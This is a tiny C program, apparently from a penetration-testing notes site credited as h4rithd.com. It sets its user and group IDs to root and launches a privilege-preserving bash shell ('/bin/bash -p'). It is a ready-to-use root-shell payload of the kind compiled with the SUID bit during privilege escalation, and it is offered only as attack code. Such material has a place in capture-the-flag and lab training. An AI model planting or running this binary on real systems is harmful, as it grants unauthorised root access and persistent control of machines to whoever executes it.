int main(void)
{
   setuid(0);
   setgid(0);
   printf("\n-----| by h4rithd.com |-----\n\n");
   system("/bin/bash -p");
}
